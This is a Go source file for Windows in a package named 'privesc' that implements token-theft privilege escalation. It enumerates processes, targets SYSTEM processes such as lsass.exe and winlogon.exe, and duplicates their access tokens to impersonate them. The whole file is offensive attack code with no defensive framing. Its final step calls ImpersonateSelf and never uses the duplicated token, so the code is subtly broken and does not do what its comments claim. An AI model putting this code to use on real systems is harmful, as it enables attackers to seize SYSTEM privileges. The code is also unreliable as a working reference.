//go:build windows
// +build windows

package privesc

import (
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// systemProcesses are candidates for token theft (they run as SYSTEM).
var systemProcesses = []string{
	"winlogon.exe",
	"lsass.exe",
	"services.exe",
	"wininit.exe",
}

func isElevated() bool {
	var token windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err != nil {
		return false
	}
	defer token.Close()
	return token.IsElevated()
}

// tryTokenImpersonation finds a SYSTEM process and impersonates its token.
func tryTokenImpersonation() bool {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(snap)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if windows.Process32First(snap, &entry) != nil {
		return false
	}

	for {
		name := strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))
		for _, target := range systemProcesses {
			if name == target {
				if ok := impersonateProcess(entry.ProcessID); ok {
					return true
				}
			}
		}
		if windows.Process32Next(snap, &entry) != nil {
			break
		}
	}
	return false
}

func impersonateProcess(pid uint32) bool {
	hProc, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(hProc)

	var procToken windows.Token
	if err := windows.OpenProcessToken(hProc, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &procToken); err != nil {
		return false
	}
	defer procToken.Close()

	var dupToken windows.Token
	if err := windows.DuplicateTokenEx(
		procToken,
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityImpersonation,
		windows.TokenImpersonation,
		&dupToken,
	); err != nil {
		return false
	}
	defer dupToken.Close()

	return windows.ImpersonateSelf(windows.SecurityImpersonation) == nil
}
